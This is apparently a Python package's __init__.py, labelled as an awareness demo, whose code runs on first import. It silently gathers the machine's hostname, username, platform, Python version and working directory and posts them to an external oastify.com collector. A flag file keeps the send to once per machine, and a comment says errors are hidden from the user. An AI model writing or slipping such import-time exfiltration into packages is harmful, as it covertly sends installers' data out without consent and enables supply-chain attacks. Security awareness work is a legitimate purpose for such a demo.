# demo_pkg/__init__.py
"""
Package init file – code here runs on first import of demo_pkg
"""
import os
import sys
import socket

# Flag to ensure data sent only once (per user/machine)
FLAG_PATH = os.path.expanduser("~/.awareness_demo_sent.flag")

if not os.path.exists(FLAG_PATH):
    try:
        data = {
            "event": "package_first_import",
            "hostname": socket.gethostname(),
            "username": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
            "python_version": sys.version.strip(),
            "platform": sys.platform,
            "cwd_at_import": os.getcwd(),
            "trigger": "first_import",
        }

        # Lazy import requests (only when needed)
        import requests

        requests.post(
            "https://y21bw8mkxzj2tmkfqkzegcg88zeq2jq8.oastify.com",
            json=data,
            timeout=8
        )

        # Create flag file to prevent repeat
        with open(FLAG_PATH, 'w') as f:
            f.write("sent on " + sys.version)

    except Exception:
        # Silent fail – user-க்கு error தெரிய வேண்டாம்
        pass
